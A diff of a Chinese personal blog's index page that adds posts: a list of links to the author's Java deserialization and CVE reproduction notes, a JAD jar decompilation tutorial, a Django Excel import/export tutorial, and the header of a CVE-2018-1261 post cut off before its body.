@@ -66,6 +66,583 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-MyJavaWebSecurityBlog" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/chenergy1991.github.io/2019/03/17/MyJavaWebSecurityBlog/" class="article-date">
+  <time datetime="2019-03-17T11:29:15.516Z" itemprop="datePublished">2019-03-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/chenergy1991.github.io/2019/03/17/MyJavaWebSecurityBlog/">我写的Java Web安全技术博客</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><ul>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzI0Mzc2NTkyNg==&amp;mid=2247484180&amp;idx=1&amp;sn=cdec331ef56926346311d8e72efd6dac&amp;chksm=e96944ddde1ecdcbc007dcb65efdeb397240700aac874c56a2823056d03534b213bafe50b05b&amp;token=1487839783&amp;lang=zh_CN#rd" target="_blank" rel="noopener">初探Java反序列化漏洞【学习笔记】</a></li>
+</ul>
+<h6 id="Weblogic"><a href="#Weblogic" class="headerlink" title="-Weblogic"></a>-Weblogic</h6><ul>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzI0Mzc2NTkyNg==&amp;mid=2247484200&amp;idx=1&amp;sn=858cf948429fcbdabda842210e6f9d5a&amp;chksm=e96944e1de1ecdf70fdcc0ad41a7202079b8dbc091fb3b7267c2025da48927994a8571d2f632&amp;token=1487839783&amp;lang=zh_CN#rd" target="_blank" rel="noopener">CVE-2018-2628：Weblogic RCE漏洞复现与分析笔记</a></li>
+<li><a href="https://mp.weixin.qq.com/s/QcdN7p1_m4X7cMQRV3npuQ" target="_blank" rel="noopener">Weblogic反序列化远程代码执行漏洞研究分析（CVE-2018-2893）</a></li>
+<li><a href="http://gnusec.org/2018/01/01/CVE-2017-10271-%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">CVE-2017-10271-分析笔记</a></li>
+</ul>
+<h6 id="Jackson"><a href="#Jackson" class="headerlink" title="-Jackson"></a>-Jackson</h6><ul>
+<li><a href="https://chenergy1991.github.io/2017/12/25/CVE-2017-7275/">CVE-2017-7275：Jackson-databind漏洞复现与分析笔记</a></li>
+</ul>
+<h4 id="Tomcat容器"><a href="#Tomcat容器" class="headerlink" title="Tomcat容器"></a>Tomcat容器</h4><ul>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzI0Mzc2NTkyNg==&amp;mid=2247484147&amp;idx=1&amp;sn=ed0a6accf99dd0d576ed69967a01f5d7&amp;chksm=e969453ade1ecc2c4b6d435df431c673caa5a91b8cd6f6112da907ac5c1c7b5f4c43011e714f&amp;token=1487839783&amp;lang=zh_CN#rd" target="_blank" rel="noopener">【学习笔记】Tomcat CVE-2017-12615 远程代码执行漏洞</a></li>
+</ul>
+<h4 id="不安全解压"><a href="#不安全解压" class="headerlink" title="不安全解压"></a>不安全解压</h4><ul>
+<li><a href="https://chenergy1991.github.io/2018/05/17/CVE-2018-1261/">CVE-2018-1261（Spring Integration Zip不安全解压漏洞）复现和分析</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://chenergy1991.github.io/2019/03/17/MyJavaWebSecurityBlog/" data-id="cjtcu8b360001o8v1yf9xonnn" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-how-to-use-jad" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/chenergy1991.github.io/2019/03/17/how-to-use-jad/" class="article-date">
+  <time datetime="2019-03-17T11:29:15.516Z" itemprop="datePublished">2019-03-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/chenergy1991.github.io/2019/03/17/how-to-use-jad/">How to use JAD?</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><code>JAD</code>是一个反编译Java class字节码的工具，我们可以用它批量地对进行反编译，本文将介绍它的使用步骤。</p>
+<h2 id="0x01-使用步骤示例"><a href="#0x01-使用步骤示例" class="headerlink" title="0x01 使用步骤示例"></a>0x01 使用步骤示例</h2><h3 id="1-下载"><a href="#1-下载" class="headerlink" title="1) 下载"></a>1) 下载</h3><p>下载地址：<a href="https://varaneckas.com/jad/" target="_blank" rel="noopener">https://varaneckas.com/jad/</a></p>
+<p>（解压后即可使用，如果jad的版本太老旧，更容易出现“ Class file version mismatch”错误；我下载的是“jad158g.win”）</p>
+<h3 id="2-解压jar包"><a href="#2-解压jar包" class="headerlink" title="2) 解压jar包"></a>2) 解压jar包</h3><p>把jar包的后缀改为<code>zip</code>，并进行解压，如图所示。</p>
+<p><img src="how-to-use-jad/Extract Jar.png" alt="Extract Jar"></p>
+<p>（我把jar包放在了“JAD”的根目录下）</p>
+<h3 id="3-执行jad-exe的命令"><a href="#3-执行jad-exe的命令" class="headerlink" title="3) 执行jad.exe的命令"></a>3) 执行jad.exe的命令</h3><p>我执行的命令如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jad.exe -r -ff -d src -s java folder/**/*.class</span><br></pre></td></tr></table></figure>
+<p>这条命令的注释如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-r：恢复源文件的目录结构</span><br><span class="line">-ff：将类属性定义放在类方法定义之前</span><br><span class="line">-d：输出目录</span><br><span class="line">src：此处的src是输出目录的名称</span><br><span class="line">-s：文件的扩展名</span><br><span class="line">folder：.class文件所在的文件夹</span><br></pre></td></tr></table></figure>
+<p>执行命令的过程如图所示：</p>
+<p><img src="how-to-use-jad/Run JAD.png" alt="Run JAD"></p>
+<p>执行结果如图所示：</p>
+<p><img src="how-to-use-jad/Result.png" alt="Result"></p>
+<p>我们可以发现，Java源文件已经按原来的目录结构被恢复了。接着也可以使用IntelliJ IDEA来审计这个jar包的源码了，如图所示。</p>
+<p><img src="how-to-use-jad/IDEA.png" alt="IDEA"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://chenergy1991.github.io/2019/03/17/how-to-use-jad/" data-id="cjtcu8b4w0005o8v1u3qhbnah" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-django-excel-tool" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/chenergy1991.github.io/2019/03/17/django-excel-tool/" class="article-date">
+  <time datetime="2019-03-17T11:29:15.501Z" itemprop="datePublished">2019-03-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/chenergy1991.github.io/2019/03/17/django-excel-tool/">可实现&#34;导入导出Excel&#34;的Django小应用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>####前言</p>
+<p>小编实现了一个“可实现导入导出Excel的Django小应用”。这篇文档是学习记录，请亲们帮我指正！</p>
+<p>小应用的GitHub网址如下：<br><a href="https://github.com/chenergy1991/P_QQ_Management" target="_blank" rel="noopener">https://github.com/chenergy1991/P_QQ_Management</a></p>
+<p>####文章主要结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1 功能简介</span><br><span class="line">2 开发环境搭建</span><br><span class="line">3 开发要点</span><br><span class="line">	3.1 建立项目</span><br><span class="line">	3.2 建立应用</span><br><span class="line">	3.3 处理模型层</span><br><span class="line">		3.3.1 配置项目INSTALLED_APPS</span><br><span class="line">		3.3.2 模型定义</span><br><span class="line">		3.3.3 生成数据移植文件</span><br><span class="line">		3.3.4 移植到数据库</span><br><span class="line">	3.4 使用管理界面</span><br><span class="line">	3.5 添加Excel导入功能</span><br><span class="line">	3.6 添加Excel导出功能</span><br><span class="line">	3.7 在其他电脑使用该Django小应用</span><br><span class="line">4 小总结</span><br><span class="line">5 一些参考资料</span><br></pre></td></tr></table></figure></p>
+<p>####1.功能简介</p>
+<p><code>可实现&quot;导入导出Excel&quot;的Django小应用</code>（以下简称“小应用”）具有如下功能点：</p>
+<ol>
+<li>可对<code>装有QQ用户信息的Excel</code>进行<code>使用Python脚本导入</code>;</li>
+<li>可对<code>QQ用户信息</code>进行<code>人工录入</code>;</li>
+<li>可对<code>QQ用户信息库</code>进行<code>数据库操作</code>;</li>
+<li>可对<code>装有QQ用户信息的Excel</code>进行<code>程序导出</code>。</li>
+</ol>
+<p>该版本的主要工作流如图所示。</p>
+<p><img src="django-excel-tool//系统工作流.png"></p>
+<p>####2.开发环境搭建</p>
+<p>我选用的开发环境如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">操作系统：Windows Server 2008 R2 Datacenter</span><br><span class="line">Python版本：Python 2.7.13</span><br><span class="line">IDE：JetBrains PyCharm 2018.3.1</span><br></pre></td></tr></table></figure>
+<p>在进行开发环境搭建时，主要要进行以下两个步骤：</p>
+<ol>
+<li><a href="https://jingyan.baidu.com/article/c45ad29c05c208051653e270.html" target="_blank" rel="noopener">安装Python环境</a></li>
+<li><a href="https://www.jetbrains.com/pycharm/" target="_blank" rel="noopener">安装PyCharm</a></li>
+</ol>
+<p>####3.开发要点</p>
+<p>本节的主要内容为：</p>
+<ol>
+<li>在<code>3.1-3.4小节</code>介绍为“小应用”加入“QQ用户信息”的管理模块，使得用户可以运用Django框架的自带管理界面对“QQ用户信息”进行<code>“增删改查”</code>；</li>
+<li>在<code>3.5小节</code>介绍为“小应用”加入”导入Excel功能”，使得用户可以将“满足格式要求的，包含QQ用户信息的Excel”导入“QQ用户信息库”；</li>
+<li>在<code>3.6小节</code>介绍为“小应用”加入”导出Excel功能”，使得用户可以运用Django框架的自带管理界面对QQ用户信息进行“Excel（CSV）导出”。</li>
+</ol>
+<p>#####3.1建立项目</p>
+<p>在PyCharm的<code>File/New Project</code>新建Django项目，如图所示。</p>
+<p><img src="django-excel-tool/New Project.png"></p>
+<p>比如我建了一个名为<code>P_QQ_Management</code>的项目。</p>
+<p>#####3.2建立应用</p>
+<p>每个Django项目可以包含多个Django应用。为了建立应用，可以使用PyCharm的<code>Tools/Run manage.py Task...</code>，如图所示。</p>
+<p><img src="django-excel-tool/Run manage.py.png"></p>
+<p>比如说，我们想要创建一个名为<code>QQUser</code>的应用，在这个终端执行命令<code>startapp QQUser</code>，如图所示。</p>
+<p><img src="django-excel-tool/startapp CVE.png"></p>
+<p>我们可以发现一个名为<code>QQUser</code>的应用在根目录生成了。</p>
+<p>#####3.3处理模型层</p>
+<p>设计模型可分为以下4个步骤：</p>
+<ol>
+<li>配置项目INSTALLED_APPS</li>
+<li>模型定义 </li>
+<li>生成数据移植文件 </li>
+<li>移植到数据库</li>
+</ol>
+<p>######3.3.1 配置项目INSTALLED_APPS</p>
+<p>要在<code>P_QQ_Management</code>项目中的<code>setting.py</code>中告诉Django需要安装应用app的模型，方法是打开<br><code>P_QQ_Management/settings.py</code>文件，找到其中的<code>INSTALLED_APPS</code>数组，在其中添加应用的名称<code>QQUser</code>，如图所示。</p>
+<p><img src="django-excel-tool/INSTALLED_APPS.png"></p>
+<p>######3.3.2 模型定义</p>
+<p>打开<code>P_QQ_Management/QQUser/models.py</code>文件，在其中新建一个模型类QQUser用来定义“QQ用户信息”，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from __future__ import unicode_literals</span><br><span class="line"></span><br><span class="line">from django.db import models</span><br><span class="line">USER_TYPE_CHOICE = (</span><br><span class="line">    (&apos;黑名单&apos;, &apos;黑名单&apos;),</span><br><span class="line">    (&apos;白名单&apos;, &apos;白名单&apos;),</span><br><span class="line">    (&apos;未归档&apos;, &apos;未归档&apos;),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">class QQUser(models.Model):</span><br><span class="line">    QQ = models.CharField(&quot;QQ号&quot;, max_length=15)</span><br><span class="line">    NickName = models.CharField(&quot;QQ昵称&quot;, max_length=30)</span><br><span class="line">    UserType = models.CharField(&quot;用户类型&quot;, choices=USER_TYPE_CHOICE, default=USER_TYPE_CHOICE[2], max_length=50)</span><br><span class="line"></span><br><span class="line">    class Meta:</span><br><span class="line">        verbose_name = u&apos;QQ管理表&apos;</span><br><span class="line">        verbose_name_plural = u&quot;QQ管理表&quot;</span><br></pre></td></tr></table></figure>
+<p>用户的模型对应着这么一张Excel表，如图所示。</p>
+<p><img src="django-excel-tool/Model-Excel.png"></p>
+<p>######3.3.3 生成数据移植文件 </p>
+<p>为了生成数据库移植文件，使用PyCharm的<code>Tools/Run manage.py Task...</code>，接着运行命令<code>makemigrations</code>，如图所示。</p>
+<p><img src="django-excel-tool/makemigrations.png"></p>
+<p>######3.3.4 移植到数据库</p>
+<p>在模型的修改过程中可以随时调用<code>makemigrations</code>生成中间移植文件。而当需要使移植文件生效、生成真实的数据库schema时，则需要调用manage.py的<code>migrate</code>命令是修改同步到数据库中。为此，使用PyCharm的<code>Tools/Run manage.py Task...</code>，接着运行命令<code>migrate</code>，如图所示。</p>
+<p><img src="django-excel-tool/migrate.png"></p>
+<p>此时，我们可以发现Django已经依据<code>QQUser/models.py</code>里定义的模型帮我们建好了数据表。</p>
+<p>在模型设计好后，可对之进行数据库的“增删改查”操作，而使用Django的管理界面实现这一目标将会很便捷。</p>
+<p>#####3.4使用管理界面</p>
+<p>Django管理界面是一个通过简单配置就可以实现数据模型后台的Web控制台。管理界面通常给系统管理员使用，以完成元数据的输入、删除、查询等工作。</p>
+<p>首先需要将管理界面需要管理的模型类添加到<code>P_QQ_Management/QQUser/admin.py</code>文件中，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from __future__ import unicode_literals</span><br><span class="line">from django.contrib import admin</span><br><span class="line">from .models import QQUser</span><br><span class="line"></span><br><span class="line">class QQUserExcelToolAdmin(admin.ModelAdmin):</span><br><span class="line">    list_display = (&apos;QQ&apos;,&apos;NickName&apos;,&apos;UserType&apos;)</span><br><span class="line">    search_fields = (&apos;QQ&apos;,&apos;NickName&apos;,&apos;UserType&apos;)</span><br><span class="line">admin.site.register(QQUser, QQUserExcelToolAdmin)</span><br></pre></td></tr></table></figure>
+<p>在第一次使用管理员界面之前，需要通过manage.py工具的createsuperuser命令建立管理员用户，在命令运行的过程中按照提示输入管理员的用户名、邮箱地址、密码。如图所示。</p>
+<p><img src="django-excel-tool/createsuperuser.png"></p>
+<p>此时，我们可以启动Django网站，并访问默认的管理员界面，如图所示。</p>
+<p><img src="django-excel-tool/admin.png"></p>
+<p>接着，我们可以借由该管理后台对数据库进行增删改查了，如图所示。</p>
+<p><img src="django-excel-tool/insert-delete-modify-query.png"></p>
+<p>为小程序加入“QQ用户信息”的管理模块的部分介绍完毕。接下来将介绍如何为小程序添加Excel信息导入功能。</p>
+<p>#####3.5 添加Excel导入功能</p>
+<p>为了将Excel里的QQ用户信息导入数据库，编写如下python脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8 -*-</span><br><span class="line">import os</span><br><span class="line">os.environ.setdefault(&quot;DJANGO_SETTINGS_MODULE&quot;, &quot;P_QQ_Management.settings&quot;)</span><br><span class="line">import django</span><br><span class="line">django.setup()</span><br><span class="line"></span><br><span class="line">from QQUser.models import QQUser</span><br><span class="line">import xlrd</span><br><span class="line"></span><br><span class="line">def import_qq_excel():</span><br><span class="line">    try:</span><br><span class="line">        # 数据源：test-file.xls</span><br><span class="line">        data = xlrd.open_workbook(&quot;test-file.xls&quot;)</span><br><span class="line">        # 第一章工作表</span><br><span class="line">        table = data.sheets()[0]</span><br><span class="line">        nrows = table.nrows</span><br><span class="line">        print(&quot;开始将QQ信息导入数据库！&quot;)</span><br><span class="line">        for i in range(1, nrows):</span><br><span class="line">            item = table.row_values(i)</span><br><span class="line">            # QQ号：位于工作表第1列</span><br><span class="line">            QQ = str(int(item[0]))</span><br><span class="line">            print(QQ)</span><br><span class="line">            # 昵称：位于工作表第2列</span><br><span class="line">            NickName = item[1]</span><br><span class="line">            # 用户类别：：位于工作表第3列</span><br><span class="line">            UserType = item[2]</span><br><span class="line">            # 创建QQUser对象</span><br><span class="line">            qqUser = QQUser(QQ = QQ, NickName = NickName, UserType = UserType)</span><br><span class="line">            # 将QQUser对象保存到数据库中</span><br><span class="line">            qqUser.save()</span><br><span class="line">        print(&quot;QQ信息导入成功&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(str(e))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    import_qq_excel()</span><br></pre></td></tr></table></figure>
+<p>在PyCharm执行这段脚本时，（使用鼠标右键点击代码编辑区，在弹出的菜单中点击<code>Run &#39;import_qq_excel&#39;</code>），如图所示。</p>
+<p><img src="django-excel-tool/run_import_qq_excel.png"></p>
+<p>系统会提示<code>No module named xlrd</code>，缺少“xlrd”这个模块。</p>
+<p><img src="django-excel-tool/hint.png"></p>
+<p>为了运行这段脚本，可以使用<code>pip</code>命令安装<code>xlrd</code>这个模块，如图所示。</p>
+<p><img src="django-excel-tool/pip install xlrd.png"></p>
+<p>继续在PyCharm中执行这段脚本时，即可将Excel导入数据库，如图所示。</p>
+<p><img src="django-excel-tool/Import Successful.png"></p>
+<p>在Django的管理平台中可以发现，Excel被存入数据库中了，如图所示。</p>
+<p><img src="django-excel-tool/Import Successful 2.png"></p>
+<p>#####3.6 添加Excel导出功能</p>
+<p>为了使得用户可以对“QQ用户信息”进行“Excel（CSV）导出”，可以仿造博客《<a href="https://www.jianshu.com/p/f52337daabe7" target="_blank" rel="noopener">Django admin后台导出Excel表格</a>》进行编码和配置，所实现出的效果如图所示。</p>
+<p><img src="django-excel-tool/page-export-excel.png"></p>
+<p>我的做法如下：</p>
+<p>(1)编写<code>csvutil.py</code>，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import csv, codecs</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">import sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;utf8&apos;)</span><br><span class="line"></span><br><span class="line">def export_as_csv_action(description=&apos;Export selected objects as CSV file&apos;, fields=None, exclude = None, header = True):</span><br><span class="line">    def export_as_csv(modeladmin, request, queryset):</span><br><span class="line">        opts = modeladmin.model._meta</span><br><span class="line">        if not fields:</span><br><span class="line">            field_names = [field for field in opts]</span><br><span class="line">        else:</span><br><span class="line">            field_names = fields</span><br><span class="line"></span><br><span class="line">        response = HttpResponse(content_type=&apos;text/csv&apos;)</span><br><span class="line">        response.write(codecs.BOM_UTF8)</span><br><span class="line">        response[&apos;Content-Disposition&apos;] = &apos;attachment; filename=&#123;&#125;.csv&apos;.format(opts.verbose_name.encode(&apos;utf-8&apos;))</span><br><span class="line">        writer = csv.writer(response)</span><br><span class="line">        if header:</span><br><span class="line">            cn_field_names = [&apos;QQ&apos;, &apos;昵称&apos;, &apos;用户类别&apos;]</span><br><span class="line"></span><br><span class="line">            writer.writerow(cn_field_names)</span><br><span class="line">        for obj in queryset:</span><br><span class="line">        #row = [getattr(obj, field)() if callable(getattr(obj, field)) else getattr(obj, field) for field in field_names]</span><br><span class="line">        #新增处理功能，比如处理时间的显示格式</span><br><span class="line">            row = []</span><br><span class="line">            for field in field_names:</span><br><span class="line">                value = getattr(obj, field).encode(&quot;utf8&quot;)</span><br><span class="line">#                if (field == &apos;publishing_time&apos;):</span><br><span class="line">#                    value = str(value)</span><br><span class="line">#                if isinstance(value, datetime.datetime):</span><br><span class="line">#                    value = value.strftime(&apos;%y-%m-%d&apos;)</span><br><span class="line">                row.append(value)</span><br><span class="line">            writer.writerow(row)</span><br><span class="line">        return response</span><br><span class="line">    export_as_csv.short_description = description</span><br><span class="line">    return export_as_csv</span><br></pre></td></tr></table></figure>
+<p>(2)在<code>admin.py</code>中导入<code>QQUser.csvutil</code>的函数<code>export_as_csv_action</code>，修改后的<code>admin.py</code>的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from __future__ import unicode_literals</span><br><span class="line">from django.contrib import admin</span><br><span class="line">from .models import QQUser</span><br><span class="line"># 导入函数export_as_csv_action</span><br><span class="line">from QQUser.csvutil import export_as_csv_action</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class QQUserExcelToolAdmin(admin.ModelAdmin):</span><br><span class="line">    list_display = (&apos;QQ&apos;,&apos;NickName&apos;,&apos;UserType&apos;)</span><br><span class="line">    search_fields = (&apos;QQ&apos;,&apos;NickName&apos;,&apos;UserType&apos;)</span><br><span class="line">    # 添加函数export_as_csv_action，自定义action</span><br><span class="line">    actions = [export_as_csv_action(&apos;导出表格&apos;,fields=[&apos;QQ&apos;, &apos;NickName&apos;, &apos;UserType&apos;])]</span><br><span class="line"># 注册后台显示相应model信息：</span><br><span class="line">admin.site.register(QQUser, QQUserExcelToolAdmin)</span><br></pre></td></tr></table></figure>
+<p>注：如果遇到“Django导出excel中文乱码解决方案”的问题，可以参照博客《<a href="http://www.cnblogs.com/413xiaol/p/6653459.html" target="_blank" rel="noopener">Django导出excel中文乱码解决方案</a>》。</p>
+<p>#####3.7 在其他电脑使用该Django小应用</p>
+<p>为了在其他电脑使用该Django小应用，可以采用以下方式：</p>
+<p>（1）将当前电脑下的Django小应用进行打包，生成<code>P_QQ_Management.zip</code>，如图所示。<br><img src="django-excel-tool/zip.png"></p>
+<p>（2）到目标电脑解压“P_QQ_Management.zip”，如图所示。</p>
+<p><img src="django-excel-tool/unzip-project.png"></p>
+<p>（3）使用PyCharm的<code>File/Open</code>打开该工程，如图所示。</p>
+<p><img src="django-excel-tool/OpenProj.png"></p>
+<p>（4）使用PyCharm的“File/Settings…”为该工程设置“Project Interpreter”，如图所示。</p>
+<p><img src="django-excel-tool/Project Interpreter.png"></p>
+<p>（5）使用PyCharm的<code>Terminal</code>如下执行脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\P_QQ_Management&gt;python manage.py migrate</span><br></pre></td></tr></table></figure>
+<p>执行结果如图所示。</p>
+<p><img src="django-excel-tool/manage.py migrate.png"></p>
+<p>注：在执行这个命令的时候，可能会遇到“NameError: name ‘reload’ is not defined 问题”，此时可以参阅博客：<a href="https://blog.csdn.net/github_35160620/article/details/52206868。" target="_blank" rel="noopener">https://blog.csdn.net/github_35160620/article/details/52206868。</a></p>
+<p>（6）在PyCharm中启动<code>P_QQ_Management</code>项目，如图所示。</p>
+<p><img src="django-excel-tool/OK.png"></p>
+<p>####4.小总结</p>
+<ul>
+<li>“Python”（中文翻译“蟒蛇”）名副其实，在处理一些小问题时，显得“简单粗暴”；</li>
+<li>“Django”的ORM（Object Relational Mapping，对象关系映射）做得比较高效；</li>
+<li>Django默认使用的数据库为“SQLite”，对于小型工程，可以直接使用之，省去部分环境配置。我们也可以为Django项目应用“MySQL”数据库，参考链接已放在文末的“一些参考资料”。</li>
+</ul>
+<p>####5.一些参考资料</p>
+<ul>
+<li><p>刘长龙的书《Python 高效开发实战 Django Tornado Flask Twisted》</p>
+</li>
+<li><p><a href="https://mp.weixin.qq.com/s/SuCwHd77vpzWM9bf-IyfbA" target="_blank" rel="noopener">django（1）初次见面-我叫姜哥</a></p>
+</li>
+<li><p><a href="https://mp.weixin.qq.com/s/RM-btc3rAX6Ebt2V7q-o-Q" target="_blank" rel="noopener">django（2）setting配置文件详解</a></p>
+</li>
+<li><p><a href="https://yq.aliyun.com/articles/484119" target="_blank" rel="noopener"> django 将后台表数据展示在前台html页面中 </a></p>
+</li>
+<li><p><a href="https://www.zmrenwu.com/post/19/" target="_blank" rel="noopener">django 实现简单的搜索功能</a></p>
+</li>
+<li><p><a href="https://jingyan.baidu.com/article/8cdccae92ffc16315413cd09.html" target="_blank" rel="noopener">django怎样使用js,css文件，静态文件无效怎么办</a></p>
+</li>
+<li><p><a href="https://www.cnblogs.com/richiewlq/p/7690621.html" target="_blank" rel="noopener">Django-MTV开发模式</a></p>
+</li>
+<li><p><a href="https://www.cnblogs.com/hwtmhj/p/6746151.html" target="_blank" rel="noopener">Python之道1-环境搭建与pycharm的配置django安装及MySQL数据库配置</a></p>
+</li>
+<li><p><a href="https://www.douban.com/note/346981959/" target="_blank" rel="noopener">django链接数据库报错Error loading MySQLdb module:No module named MySQLdb</a></p>
+</li>
+<li><p><a href="https://segmentfault.com/a/1190000003555520" target="_blank" rel="noopener">django 1.8 官方文档翻译： 2-5-6 多数据库</a></p>
+</li>
+<li><p><a href="https://www.cnblogs.com/sheng-247/p/Django.html" target="_blank" rel="noopener">创建Django 项目时连接MySQL报错</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/dg_summer/article/details/77046294" target="_blank" rel="noopener">别人Django项目，我如何运行</a></p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://chenergy1991.github.io/2019/03/17/django-excel-tool/" data-id="cjtcu8b6h0006o8v1kwhwjlzv" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-CVE-2018-1261" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/chenergy1991.github.io/2019/03/17/CVE-2018-1261/" class="article-date">
+  <time datetime="2019-03-17T11:29:15.438Z" itemprop="datePublished">2019-03-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/chenergy1991.github.io/2019/03/17/CVE-2018-1261/">CVE-2018-1261（Spring Integration Zip不安全解压漏洞）复现和分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
